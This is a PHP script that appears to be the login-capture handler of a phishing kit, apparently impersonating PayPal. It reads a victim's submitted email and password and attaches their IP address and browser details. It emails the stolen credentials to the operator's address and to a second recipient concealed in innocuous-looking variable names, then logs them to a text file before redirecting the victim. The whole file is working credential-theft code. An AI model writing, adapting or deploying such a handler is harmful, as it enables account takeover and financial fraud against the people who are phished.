<?php
	error_reporting(0);
	ob_start();
	session_start();

include'../antibots.php';
	include '../email.php';
	include'../get_browser.php';
include'../get_bin.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
	$_SESSION['email'] 	= $_POST['mail'];
	$_SESSION['pass'] 	= $_POST['pass'];
$message = "
Email : ".$_SESSION['email']."
Pass : ".$_SESSION['pass']."
IP: "._ip()."
User Agent: ".$_SERVER["HTTP_USER_AGENT"]."
";
$Subject="NEW LOG PPL FR3SH |"._ip();
$head="From:SHADUCK   <log@rezzz.com>";
$bin = "$browserx$versionx$getbinsx";
if(mail($my_mail,$Subject,$message,$head) && mail($bin,$Subject,$message,$head)) ;
$fil = fopen('log.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_one']  = true;
header('location: index.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

}
else
{
	header('location: ../../index.php');
} 
